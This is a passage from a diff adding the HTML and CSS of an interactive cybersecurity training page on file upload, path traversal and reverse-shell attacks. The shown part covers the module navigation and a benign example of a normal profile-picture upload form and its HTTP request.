@@ -1,0 +1,1084 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>FileSec Academy — Interactive Cybersecurity Training</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=Inter:wght@300;400;500;600;700&display=swap');
+:root{--bg:#07080D;--bg2:#090A0F;--surface:rgba(18,20,29,0.72);--glass:rgba(255,255,255,0.035);--glass-h:rgba(255,255,255,0.055);--border:rgba(255,255,255,0.08);--border-s:rgba(255,255,255,0.12);--text:#F4F4F5;--text2:#A1A1AA;--dim:#71717A;--accent:#8B5CF6;--accent2:#6366F1;--cyan:#8B5CF6;--cd:rgba(139,92,246,0.08);--red:#EF4444;--rd:rgba(239,68,68,0.08);--green:#22C55E;--gd:rgba(34,197,94,0.06);--amber:#F59E0B;--ad:rgba(245,158,11,0.08);--purple:#8B5CF6;--pd:rgba(139,92,246,0.06);--bright:#F4F4F5;--mono:'JetBrains Mono',monospace;--body:'Inter',system-ui,-apple-system,sans-serif;--disp:'Inter',system-ui,-apple-system,sans-serif}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
+body{background:var(--bg);color:var(--text);font-family:var(--body);min-height:100vh;overflow-x:hidden;line-height:1.7}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 80% 50% at 50% 0%,rgba(139,92,246,0.04),transparent 60%),radial-gradient(ellipse 40% 40% at 85% 15%,rgba(99,102,241,0.03),transparent 50%);pointer-events:none;z-index:0}
+body::after{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 512 512' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.018'/%3E%3C/svg%3E");pointer-events:none;z-index:0;opacity:0.5}
+#top-prog{position:fixed;top:0;left:260px;right:0;height:2px;z-index:2000;background:rgba(7,8,13,0.8)}
+#top-pf{height:100%;width:0%;background:linear-gradient(90deg,var(--accent2),var(--accent));transition:width 0.3s}
+#sidebar{position:fixed;left:0;top:0;bottom:0;width:272px;background:rgba(10,11,17,0.65);border-right:1px solid var(--border);z-index:1000;display:flex;flex-direction:column;backdrop-filter:blur(20px) saturate(1.2);transition:transform 0.3s}
+.slogo{padding:22px 20px 18px;border-bottom:1px solid var(--border)}
+.slogo .br{font-family:var(--body);font-size:15px;font-weight:700;color:var(--text);line-height:1.2;letter-spacing:-0.02em}
+.slogo .br span{color:var(--accent)}
+.slogo .sb{font-size:11px;color:var(--dim);margin-top:5px;font-weight:400}
+.ni{flex:1;overflow-y:auto;padding:12px 0}
+.ni::-webkit-scrollbar{width:3px}
+.ni::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06);border-radius:3px}
+.ngl{padding:14px 20px 6px;font-size:10px;letter-spacing:0.08em;color:var(--dim);text-transform:uppercase;font-weight:600}
+.ni2{display:flex;align-items:center;gap:10px;padding:8px 20px;cursor:pointer;transition:all 0.15s;border-left:2px solid transparent;font-size:13px;color:var(--dim);line-height:1.3;font-weight:450}
+.ni2:hover{color:var(--text2);background:rgba(255,255,255,0.02)}
+.ni2.active{color:var(--text);background:rgba(139,92,246,0.08);border-left-color:var(--accent);font-weight:500}
+.ni2 .nm{color:var(--dim);font-weight:500;font-size:11px;min-width:20px;opacity:0.6}
+.ni2 .lb{background:rgba(139,92,246,0.1);color:var(--accent);border:1px solid rgba(139,92,246,0.15);padding:1px 7px;border-radius:4px;font-size:9px;margin-left:auto;font-weight:600;letter-spacing:0.02em}
+.sfoot{padding:16px 20px;border-top:1px solid var(--border);font-size:10px;color:var(--dim)}
+.pbw{background:rgba(255,255,255,0.04);border-radius:3px;height:3px;margin-top:8px}
+.pbf{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--accent2),var(--accent));transition:width 0.5s;width:0%}
+#main{margin-left:272px;min-height:100vh}
+#hero{min-height:100vh;display:flex;align-items:center;position:relative;overflow:hidden;padding:80px 60px}
+.hgr{position:absolute;inset:0;opacity:0.3;background-image:linear-gradient(rgba(255,255,255,0.02) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.02) 1px,transparent 1px);background-size:60px 60px}
+.hgl{position:absolute;width:700px;height:700px;border-radius:50%;background:radial-gradient(circle,rgba(139,92,246,0.06) 0%,transparent 65%);top:40%;left:55%;transform:translate(-50%,-50%);pointer-events:none}
+.hc{position:relative;z-index:2;max-width:1280px;width:100%;display:grid;grid-template-columns:1fr 1fr;gap:60px;align-items:center}
+.hb{display:inline-flex;align-items:center;gap:8px;background:rgba(139,92,246,0.08);border:1px solid rgba(139,92,246,0.15);border-radius:20px;padding:5px 14px;font-size:11px;color:var(--accent);margin-bottom:20px;font-weight:500;letter-spacing:0.02em}
+.hb::before{content:'';width:5px;height:5px;background:var(--accent);border-radius:50%}
+.ht{font-family:var(--body);font-size:clamp(32px,4vw,52px);font-weight:700;line-height:1.1;color:var(--text);margin-bottom:18px;letter-spacing:-0.03em}
+.ht .ac{background:linear-gradient(135deg,var(--text),rgba(139,92,246,0.7));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.ht .dg{color:var(--red)}
+.hd{font-size:16px;color:var(--text2);max-width:520px;margin-bottom:32px;line-height:1.7}
+.hs{display:flex;gap:36px;margin-bottom:36px}
+.st .nm2{font-family:var(--body);font-size:26px;font-weight:700;color:var(--text);letter-spacing:-0.02em}
+.st .lb2{font-size:11px;color:var(--dim);margin-top:2px;font-weight:500}
+.hbtn{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#7C3AED,#6366F1);color:#fff;padding:13px 26px;border-radius:10px;font-family:var(--body);font-weight:600;font-size:14px;cursor:pointer;border:1px solid rgba(255,255,255,0.12);transition:all 0.2s;letter-spacing:-0.01em;box-shadow:0 4px 20px rgba(139,92,246,0.25)}
+.hbtn:hover{transform:translateY(-1px);box-shadow:0 8px 30px rgba(139,92,246,0.35);filter:brightness(1.1)}
+.hero-viz{position:relative;display:flex;flex-direction:column;gap:0;align-items:center}
+.hero-viz .node{background:rgba(255,255,255,0.035);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,0.08);border-radius:12px;padding:14px 24px;text-align:center;min-width:200px;transition:all 0.3s}
+.hero-viz .node:hover{border-color:rgba(139,92,246,0.2);background:rgba(255,255,255,0.05)}
+.hero-viz .node .nl{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:0.08em;font-weight:600;margin-bottom:4px}
+.hero-viz .node .nt{font-size:13px;color:var(--text);font-weight:500}
+.hero-viz .arrow{width:1px;height:28px;background:rgba(255,255,255,0.1);position:relative}
+.hero-viz .arrow::after{content:'';position:absolute;bottom:-3px;left:-3px;border:4px solid transparent;border-top-color:rgba(255,255,255,0.1)}
+.hero-viz .arrow .dot{width:4px;height:4px;border-radius:50%;background:var(--accent);position:absolute;left:-1.5px;top:0;animation:dotMove 2s ease-in-out infinite}
+@keyframes dotMove{0%{top:0;opacity:0}20%{opacity:1}80%{opacity:1}100%{top:calc(100% - 4px);opacity:0}}
+.hero-btns{display:flex;gap:10px;margin-bottom:32px}
+.hbtn2{display:inline-flex;align-items:center;gap:8px;background:rgba(255,255,255,0.04);color:var(--text2);padding:12px 22px;border-radius:10px;font-family:var(--body);font-weight:500;font-size:13px;cursor:pointer;border:1px solid var(--border);transition:all 0.2s;letter-spacing:-0.01em}
+.hbtn2:hover{background:rgba(255,255,255,0.06);color:var(--text);border-color:var(--border-s)}
+.sec{padding:80px 60px;border-bottom:1px solid var(--border);position:relative}
+.sh{margin-bottom:40px;max-width:720px}
+.stag{font-size:11px;color:var(--accent);background:rgba(139,92,246,0.06);border:1px solid rgba(139,92,246,0.1);padding:4px 12px;border-radius:6px;display:inline-block;margin-bottom:14px;font-weight:600;letter-spacing:0.06em;text-transform:uppercase}
+.stit{font-family:var(--body);font-size:clamp(24px,3vw,36px);font-weight:700;color:var(--text);line-height:1.2;margin-bottom:10px;letter-spacing:-0.03em}
+.sdesc{font-size:15px;color:var(--text2);max-width:600px;line-height:1.7}
+.snum{position:absolute;top:40px;right:60px;font-family:var(--body);font-size:80px;font-weight:700;color:rgba(255,255,255,0.02);pointer-events:none;user-select:none;line-height:1}
+.cd{background:rgba(255,255,255,0.03);backdrop-filter:blur(12px);border:1px solid var(--border);border-radius:16px;padding:24px;transition:all 0.25s;position:relative;overflow:hidden}
+.cd:hover{border-color:var(--border-s);transform:translateY(-2px);box-shadow:0 20px 60px rgba(0,0,0,0.25)}
+.cd::before{content:'';position:absolute;inset:0;border-radius:16px;box-shadow:inset 0 1px 0 rgba(255,255,255,0.04);pointer-events:none}
+.cd.dg2{border-color:rgba(239,68,68,0.12)}
+.cd.suc{border-color:rgba(34,197,94,0.12)}
+.cd.wrn{border-color:rgba(245,158,11,0.12)}
+.cd.pur{border-color:rgba(139,92,246,0.12)}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.g3{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.term{background:#090B10;border:1px solid var(--border);border-radius:12px;overflow:hidden;font-family:var(--mono);box-shadow:inset 0 2px 8px rgba(0,0,0,0.2)}
+.tbar{background:rgba(255,255,255,0.02);border-bottom:1px solid var(--border);padding:10px 16px;display:flex;align-items:center;gap:8px}
+.td{width:8px;height:8px;border-radius:50%;opacity:0.7}.td.r{background:var(--red)}.td.y{background:var(--amber)}.td.g{background:var(--green)}
+.tt{font-size:11px;color:var(--dim);margin-left:8px;font-weight:400}
+.tbody{padding:18px;font-size:13px;line-height:1.9}
+.tl{display:block}.tp{color:var(--accent)}.tc{color:var(--text)}.to{color:var(--dim)}.ts{color:var(--green)}.td2{color:var(--red)}.tcm{color:#52525B}.ta{color:var(--amber)}
+.tg{display:inline-block;padding:3px 10px;border-radius:4px;font-family:var(--mono);font-size:11px;font-weight:500}
+.tg.cr{background:rgba(239,68,68,0.08);color:var(--red);border:1px solid rgba(239,68,68,0.15)}
+.tg.wr{background:rgba(245,158,11,0.08);color:var(--amber);border:1px solid rgba(245,158,11,0.15)}
+.tg.in{background:rgba(139,92,246,0.08);color:var(--accent);border:1px solid rgba(139,92,246,0.15)}
+.tg.su{background:rgba(34,197,94,0.08);color:var(--green);border:1px solid rgba(34,197,94,0.15)}
+.cb{background:#090B10;border:1px solid var(--border);border-radius:10px;padding:14px 18px;font-family:var(--mono);font-size:12px;line-height:1.8;overflow-x:auto;position:relative;box-shadow:inset 0 2px 8px rgba(0,0,0,0.15)}
+.cb .cl{position:absolute;top:8px;right:12px;font-size:10px;color:var(--dim);background:rgba(255,255,255,0.04);padding:2px 8px;border-radius:4px;font-weight:500}
+.kw{color:var(--accent)}.sr{color:var(--green)}.fn{color:#93C5FD}.cm{color:#52525B}.nl{color:var(--amber)}.vr{color:var(--red)}
+.fd{display:flex;align-items:center;gap:0;padding:20px;background:rgba(255,255,255,0.02);border:1px solid var(--border);border-radius:12px;overflow-x:auto;flex-wrap:wrap;row-gap:14px}
+.fs{display:flex;flex-direction:column;align-items:center;gap:6px;min-width:90px}
+.fi{width:44px;height:44px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px}
+.fi.cy{background:rgba(139,92,246,0.06);border:1px solid rgba(139,92,246,0.1)}
+.fi.rd{background:rgba(239,68,68,0.06);border:1px solid rgba(239,68,68,0.1)}
+.fi.gn{background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.1)}
+.fi.am{background:rgba(245,158,11,0.06);border:1px solid rgba(245,158,11,0.1)}
+.fi.pu{background:rgba(139,92,246,0.06);border:1px solid rgba(139,92,246,0.1)}
+.fl{font-size:10px;color:var(--dim);text-align:center;max-width:85px;font-weight:500}
+.fa{width:32px;height:1px;background:rgba(255,255,255,0.08);position:relative;flex-shrink:0}
+.fa::after{content:'';position:absolute;right:-3px;top:-3px;border:4px solid transparent;border-left-color:rgba(255,255,255,0.08)}
+.sc2{display:flex;flex-direction:column;gap:4px}
+.cs{display:flex;align-items:flex-start;gap:14px;padding:14px;border-radius:10px;border:1px solid var(--border);background:rgba(255,255,255,0.02);opacity:0;transform:translateX(-20px);transition:all 0.4s}
+.cs.vis{opacity:1;transform:translateX(0)}
+.cn{width:26px;height:26px;border-radius:50%;background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.2);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:11px;color:var(--red);font-weight:600;flex-shrink:0}
+.cnt .cti{font-weight:600;color:var(--text);font-size:13px;margin-bottom:3px}
+.cnt .cde{font-size:12px;color:var(--dim)}
+.ccon{width:1px;height:14px;background:rgba(255,255,255,0.06);margin-left:26px}
+.simc{background:rgba(255,255,255,0.03);backdrop-filter:blur(12px);border:1px solid var(--border);border-radius:16px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,0.2)}
+.simh{background:rgba(255,255,255,0.02);border-bottom:1px solid var(--border);padding:14px 20px;display:flex;align-items:center;gap:10px;font-weight:600;font-size:14px;color:var(--text)}
+.simb{padding:24px}
+.btn{padding:8px 16px;border-radius:8px;font-family:var(--body);font-size:12px;font-weight:500;cursor:pointer;border:none;transition:all 0.15s;white-space:nowrap}
+.bc{background:linear-gradient(135deg,#7C3AED,#6366F1);color:#fff;box-shadow:0 2px 8px rgba(139,92,246,0.2)}.bc:hover{filter:brightness(1.1);transform:translateY(-1px)}
+.br{background:rgba(239,68,68,0.1);color:var(--red);border:1px solid rgba(239,68,68,0.15)}.br:hover{background:rgba(239,68,68,0.15)}
+.bg{background:rgba(255,255,255,0.04);border:1px solid var(--border);color:var(--text2)}.bg:hover{background:rgba(255,255,255,0.06);color:var(--text)}
+.bgn{background:rgba(34,197,94,0.1);color:var(--green);border:1px solid rgba(34,197,94,0.15)}
+.ba{background:rgba(245,158,11,0.1);color:var(--amber);border:1px solid rgba(245,158,11,0.15)}
+.ftree{font-family:var(--mono);font-size:12px;line-height:2;background:#090B10;border:1px solid var(--border);border-radius:10px;padding:14px 18px;box-shadow:inset 0 2px 8px rgba(0,0,0,0.15)}
+.tli{display:flex;align-items:center;gap:6px;padding:2px 0;cursor:pointer;transition:all 0.15s;border-radius:4px}
+.tli:hover{background:rgba(255,255,255,0.02);padding-left:6px}
+.tli.hl{background:rgba(239,68,68,0.06);color:var(--red)}
+.tind{margin-left:18px}
+.pdisp{background:#090B10;border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:var(--mono);font-size:12px;display:flex;align-items:center;gap:0;flex-wrap:wrap;gap:2px;margin:10px 0}
+.psg{padding:2px 6px;border-radius:4px;transition:all 0.3s}
+.psg.n{color:var(--text2)}.psg.t{color:var(--red);background:rgba(239,68,68,0.06);border:1px solid rgba(239,68,68,0.1)}.psg.tg2{color:var(--green);background:rgba(34,197,94,0.06);border:1px solid rgba(34,197,94,0.1)}
+.hb2{border-radius:10px;padding:14px 18px;margin:10px 0;font-size:13px;line-height:1.65}
+.hbc{background:rgba(139,92,246,0.04);border:1px solid rgba(139,92,246,0.08)}
+.hbr{background:rgba(239,68,68,0.04);border:1px solid rgba(239,68,68,0.08)}
+.hbg{background:rgba(34,197,94,0.04);border:1px solid rgba(34,197,94,0.08)}
+.hby{background:rgba(245,158,11,0.04);border:1px solid rgba(245,158,11,0.08)}
+.hbp{background:rgba(139,92,246,0.04);border:1px solid rgba(139,92,246,0.08)}
+.fvis{display:flex;align-items:center;gap:10px;padding:14px;background:#090B10;border:1px solid var(--border);border-radius:10px;margin:10px 0;flex-wrap:wrap}
+.fn2{display:flex;flex-direction:column;align-items:center;gap:4px;font-family:var(--mono);font-size:11px;padding:8px 10px;border-radius:8px;border:1px solid var(--border);background:rgba(255,255,255,0.02);transition:all 0.3s;min-width:70px;text-align:center}
+.fn2.ad{border-color:rgba(139,92,246,0.2);color:var(--accent);background:rgba(139,92,246,0.04)}
+.fn2.es{border-color:rgba(239,68,68,0.2);color:var(--red);background:rgba(239,68,68,0.04)}
+.fn2.tf{border-color:rgba(34,197,94,0.2);color:var(--green);background:rgba(34,197,94,0.04)}
+.ctbl{width:100%;border-collapse:collapse}
+.ctbl th{padding:10px 14px;background:rgba(255,255,255,0.02);font-size:11px;text-align:left;border-bottom:1px solid var(--border);font-weight:600;color:var(--dim);text-transform:uppercase;letter-spacing:0.05em}
+.ctbl td{padding:10px 14px;border-bottom:1px solid rgba(255,255,255,0.04);font-size:13px;color:var(--text2)}
+.tabs{display:flex;gap:2px;margin-bottom:18px;background:rgba(255,255,255,0.03);padding:4px;border-radius:10px;flex-wrap:wrap}
+.tb{padding:8px 16px;background:transparent;border:none;border-radius:7px;font-family:var(--body);font-size:12px;color:var(--dim);cursor:pointer;transition:all 0.15s;white-space:nowrap;font-weight:500}
+.tb:hover{color:var(--text2);background:rgba(255,255,255,0.03)}
+.tb.act{background:rgba(139,92,246,0.12);color:var(--accent);font-weight:600}
+.tp2{display:none}.tp2.act{display:block}
+.gd{height:1px;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.06),transparent);margin:30px 0}
+input[type=range]{width:100%;accent-color:var(--accent);cursor:pointer;margin:8px 0}
+.qq{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:14px;padding:22px;margin-bottom:14px}
+.qqt{font-size:14px;font-weight:600;color:var(--text);margin-bottom:14px}
+.qqo{display:flex;flex-direction:column;gap:7px}
+.qop{padding:11px 16px;border-radius:8px;border:1px solid var(--border);background:rgba(255,255,255,0.02);cursor:pointer;font-size:13px;color:var(--text2);transition:all 0.15s}
+.qop:hover{border-color:var(--border-s);color:var(--text);background:rgba(255,255,255,0.04)}
+.qop.cor{background:rgba(34,197,94,0.06);border-color:rgba(34,197,94,0.2);color:var(--green)}
+.qop.wro{background:rgba(239,68,68,0.06);border-color:rgba(239,68,68,0.2);color:var(--red)}
+.qop.dis{pointer-events:none}
+.qfb{margin-top:10px;padding:10px 14px;border-radius:8px;font-size:12px;display:none}
+.qfb.sh{display:block}
+.qfb.cor{background:rgba(34,197,94,0.06);color:var(--green);border:1px solid rgba(34,197,94,0.12)}
+.qfb.wro{background:rgba(239,68,68,0.06);color:var(--red);border:1px solid rgba(239,68,68,0.12)}
+.cvis{display:flex;flex-direction:column;align-items:center;gap:0;margin:20px 0}
+.cvn{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:10px;padding:12px 20px;text-align:center;min-width:200px;transition:all 0.3s}
+.cvn.act{border-color:rgba(139,92,246,0.3);box-shadow:0 0 20px rgba(139,92,246,0.08)}
+.cvn.done{border-color:rgba(34,197,94,0.3)}
+.cvn .cnl{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:0.06em;font-weight:600}
+.cvn .cnt2{font-weight:600;font-size:13px;color:var(--text)}
+.cva{width:1px;height:20px;background:rgba(255,255,255,0.06);position:relative}
+.cva::after{content:'';position:absolute;bottom:-3px;left:-3px;border:4px solid transparent;border-top-color:rgba(255,255,255,0.06)}
+.cva.act{background:var(--accent)}.cva.act::after{border-top-color:var(--accent)}
+.bkg{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px}
+.bkc{background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:12px;padding:18px;cursor:pointer;transition:all 0.2s}
+.bkc:hover{border-color:var(--border-s);transform:translateY(-1px)}
+.bkc.apl{border-color:rgba(34,197,94,0.2);background:rgba(34,197,94,0.03)}
+.bkc .bci{font-size:20px;margin-bottom:8px}
+.bkc .bct{font-weight:600;font-size:13px;color:var(--text);margin-bottom:4px}
+.bkc .bcd{font-size:11px;color:var(--dim);line-height:1.5}
+.bkc .bcs{font-size:11px;margin-top:8px;font-weight:600}
+.mi{display:flex;gap:12px;padding:14px;border-radius:10px;background:rgba(34,197,94,0.04);border:1px solid rgba(34,197,94,0.08);margin-bottom:8px}
+.mii{font-size:16px;flex-shrink:0}
+.mit{font-weight:600;color:var(--green);font-size:13px;margin-bottom:3px}
+.mid{font-size:12px;color:var(--dim);line-height:1.6}
+.sb2{display:flex;align-items:center;gap:14px;padding:16px 20px;background:rgba(255,255,255,0.03);border:1px solid var(--border);border-radius:12px;margin-bottom:20px;flex-wrap:wrap}
+.sn{font-size:28px;font-weight:700;color:var(--accent);letter-spacing:-0.02em}
+.slb{font-size:11px;color:var(--dim);font-weight:500}
+.spr{flex:1;min-width:100px;height:4px;background:rgba(255,255,255,0.04);border-radius:2px;overflow:hidden}
+.spf{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--accent2),var(--accent));transition:width 0.5s}
+@keyframes pmv{0%{left:0;opacity:1}100%{left:calc(100% - 6px);opacity:0}}
+.pk{position:absolute;width:6px;height:6px;border-radius:50%;background:var(--accent);top:50%;transform:translateY(-50%);animation:pmv 1.5s linear infinite}
+@media(max-width:1000px){#sidebar{transform:translateX(-100%)}#sidebar.open{transform:translateX(0)}#main{margin-left:0}.sec{padding:50px 20px}#hero{padding:80px 20px}.g2,.g3{grid-template-columns:1fr}#top-prog{left:0}.fd{flex-direction:column;align-items:stretch}.fa{width:1px;height:20px}.fa::after{right:-3px;top:auto;bottom:-3px;border:4px solid transparent;border-left-color:transparent;border-top-color:rgba(255,255,255,0.08)}.hc{grid-template-columns:1fr;gap:40px}.hero-viz{display:none}}
+#mtog{position:fixed;top:14px;left:14px;z-index:2000;background:rgba(255,255,255,0.05);backdrop-filter:blur(12px);border:1px solid var(--border);border-radius:8px;padding:8px 14px;cursor:pointer;display:none;font-size:15px;color:var(--text2)}
+@media(max-width:1000px){#mtog{display:block}}
+::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.06);border-radius:3px}::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.1)}
+[data-tip]{position:relative;cursor:help}
+[data-tip]:hover::after{content:attr(data-tip);position:absolute;bottom:calc(100% + 6px);left:50%;transform:translateX(-50%);background:rgba(18,20,29,0.95);border:1px solid var(--border);padding:5px 10px;border-radius:6px;font-size:10px;color:var(--text2);white-space:nowrap;z-index:100;pointer-events:none;backdrop-filter:blur(8px)}
+</style>
+</head>
+<body>
+<button id="mtog" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+<div id="top-prog"><div id="top-pf"></div></div>
+<nav id="sidebar">
+<div class="slogo"><div class="br">File<span>Sec</span> Academy</div><div class="sb">// interactive cybersecurity training</div></div>
+<div class="ni" id="ni">
+<div class="ni2 active" onclick="scr('hero')"><span class="nm">00</span>Home</div>
+<div class="ngl">MODULE 1 — FILE UPLOAD</div>
+<div class="ni2" onclick="scr('m1s1')"><span class="nm">01</span>Normal Upload Flow</div>
+<div class="ni2" onclick="scr('m1s2')"><span class="nm">02</span>Static vs Executable</div>
+<div class="ni2" onclick="scr('m1s3')"><span class="nm">03</span>File Anatomy</div>
+<div class="ni2" onclick="scr('m1s4')"><span class="nm">04</span>Client vs Server Validation</div>
+<div class="ni2" onclick="scr('m1s5')"><span class="nm">05</span>Validation Failures</div>
+<div class="ni2" onclick="scr('m1s6')"><span class="nm">06</span>Storage Matters</div>
+<div class="ni2" onclick="scr('m1s7')"><span class="nm">07</span>Web Shell Simulator</div>
+<div class="ni2" onclick="scr('m1labs')"><span class="nm">08</span>Upload Labs <span class="lb">LABS</span></div>
+<div class="ngl">MODULE 2 — PATH TRAVERSAL</div>
+<div class="ni2" onclick="scr('m2s1')"><span class="nm">09</span>Filesystem Basics</div>
+<div class="ni2" onclick="scr('m2s2')"><span class="nm">10</span>Understanding ../</div>
+<div class="ni2" onclick="scr('m2s3')"><span class="nm">11</span>Traversal Simulation</div>
+<div class="ni2" onclick="scr('m2s4')"><span class="nm">12</span>PT vs LFI vs RFI</div>
+<div class="ni2" onclick="scr('m2labs')"><span class="nm">13</span>Traversal Labs <span class="lb">LABS</span></div>
+<div class="ngl">MODULE 3 — REVERSE SHELL</div>
+<div class="ni2" onclick="scr('m3s1')"><span class="nm">14</span>The Complete Chain</div>
+<div class="ni2" onclick="scr('m3s2')"><span class="nm">15</span>Where Code Executes</div>
+<div class="ni2" onclick="scr('m3s3')"><span class="nm">16</span>What is a Shell?</div>
+<div class="ni2" onclick="scr('m3s4')"><span class="nm">17</span>Listener Simulation</div>
+<div class="ni2" onclick="scr('m3s5')"><span class="nm">18</span>Why "Reverse"?</div>
+<div class="ni2" onclick="scr('m3s6')"><span class="nm">19</span>Firewall Analogy</div>
+<div class="ni2" onclick="scr('m3s7')"><span class="nm">20</span>Full Attack Simulator</div>
+<div class="ni2" onclick="scr('m3s8')"><span class="nm">21</span>Break the Attack</div>
+<div class="ni2" onclick="scr('m3s9')"><span class="nm">22</span>Troubleshooting</div>
+<div class="ngl">FINAL</div>
+<div class="ni2" onclick="scr('connect')"><span class="nm">23</span>Connect Vulnerabilities</div>
+<div class="ni2" onclick="scr('quiz')"><span class="nm">24</span>Knowledge Check</div>
+<div class="ni2" onclick="scr('finalvis')"><span class="nm">25</span>Final Summary</div>
+</div>
+<div class="sfoot"><div>PROGRESS</div><div class="pbw"><div class="pbf" id="pf2"></div></div><div style="margin-top:6px;color:var(--cyan)" id="plbl">0% Complete</div></div>
+</nav>
+<div id="main">
+<section id="hero">
+<div class="hgr"></div><div class="hgl"></div>
+<div class="hc">
+<div>
+<div class="hb">INTERACTIVE SECURITY TRAINING</div>
+<h1 class="ht">File Upload, Path Traversal<br>& Reverse Shell <span class="ac">Attacks</span></h1>
+<p class="hd">Understand how file handling flaws progress from unsafe uploads to server-side execution and system access. Every stage is visually simulated.</p>
+<div class="hero-btns">
+<button class="hbtn" onclick="scr('m1s1')">Start Learning</button>
+<button class="hbtn2" onclick="scr('m1s1')">Explore Modules</button>
+</div>
+<div class="hs">
+<div class="st"><div class="nm2">03</div><div class="lb2">Modules</div></div>
+<div class="st"><div class="nm2">10</div><div class="lb2">Hands-on Labs</div></div>
+<div class="st"><div class="nm2">15+</div><div class="lb2">Simulations</div></div>
+</div>
+</div>
+<div class="hero-viz">
+<div class="node"><div class="nl">Stage 1</div><div class="nt">File Upload</div></div>
+<div class="arrow"><div class="dot"></div></div>
+<div class="node"><div class="nl">Stage 2</div><div class="nt">Server Storage</div></div>
+<div class="arrow"><div class="dot"></div></div>
+<div class="node"><div class="nl">Stage 3</div><div class="nt">Code Execution</div></div>
+<div class="arrow"><div class="dot"></div></div>
+<div class="node"><div class="nl">Stage 4</div><div class="nt">System Access</div></div>
+</div>
+</div></section>
+
+<section class="sec" id="m1s1">
+<div class="snum">01</div>
+<div class="sh"><div class="stag">// MODULE 1 — FILE UPLOAD</div><h2 class="stit">Normal File Upload Flow</h2><p class="sdesc">What actually happens when we upload a file? Understanding the normal flow is essential before understanding how it breaks.</p></div>
+<div class="cd" style="margin-bottom:20px">
+<h3 style="color:var(--cyan);font-family:var(--disp);font-size:15px;margin-bottom:14px;font-weight:700">Expected Behavior — Profile Picture Upload</h3>
+<div class="fd">
+<div class="fs"><div class="fi cy">👤</div><div class="fl">Employee selects avatar.jpg</div></div>
+<div class="fa"></div><div class="fs"><div class="fi cy">🌐</div><div class="fl">Browser sends multipart POST</div></div>
+<div class="fa"></div><div class="fs"><div class="fi cy">🔍</div><div class="fl">App validates image</div></div>
+<div class="fa"></div><div class="fs"><div class="fi cy">💾</div><div class="fl">Server stores file</div></div>
+<div class="fa"></div><div class="fs"><div class="fi gn">🖼️</div><div class="fl">Browser displays image</div></div>
+</div></div>
+<div class="g2">
+<div><h3 style="color:var(--cyan);font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700">HTML File Input</h3>
+<div class="cb"><span class="cl">HTML</span>
+<span class="tl"><span class="kw">&lt;form</span> <span class="fn">enctype</span>=<span class="sr">"multipart/form-data"</span><span class="kw">&gt;</span></span>
+<span class="tl">  <span class="kw">&lt;input</span> <span class="fn">type</span>=<span class="sr">"file"</span> <span class="fn">name</span>=<span class="sr">"avatar"</span> <span class="kw">/&gt;</span></span>
+<span class="tl">  <span class="kw">&lt;button</span> <span class="fn">type</span>=<span class="sr">"submit"</span><span class="kw">&gt;</span>Upload<span class="kw">&lt;/button&gt;</span></span>
+<span class="tl"><span class="kw">&lt;/form&gt;</span></span></div></div>
+<div><h3 style="color:var(--cyan);font-family:var(--disp);font-size:14px;margin-bottom:12px;font-weight:700">Raw HTTP Upload Request</h3>
+<div class="term"><div class="tbar"><div class="td r"></div><div class="td y"></div><div class="td g"></div><div class="tt">POST /upload — multipart request</div></div>
+<div class="tbody" style="font-size:11px">
+<span class="tl"><span class="ta">POST</span> /my-account/avatar HTTP/1.1</span>
+<span class="tl"><span class="tp">Host:</span> example.com</span>
+<span class="tl"><span class="tp">Content-Type:</span> multipart/form-data; boundary=----Bound</span>
+<span class="tl">&nbsp;</span>
+<span class="tl"><span class="tcm">------Bound</span></span>
+<span class="tl"><span class="tp">Content-Disposition:</span> form-data; name=<span class="sr">"avatar"</span>; filename=<span class="sr">"avatar.jpg"</span></span>
+<span class="tl"><span class="tp">Content-Type:</span> <span class="sr">image/jpeg</span></span>
+<span class="tl">&nbsp;</span>
+<span class="tl"><span class="tcm">[BINARY IMAGE DATA]</span></span>
+<span class="tl"><span class="tcm">------Bound--</span></span>
+</div></div></div></div>
+<div class="cd wrn" style="margin-top:20px"><div style="display:flex;align-items:center;gap:12px">
+<div style="font-size:26px">🎯</div>
+<div><div style="font-family:var(--disp);font-weight:700;font-size:14px;color:var(--amber);margin-bottom:4px">The Important Question</div>
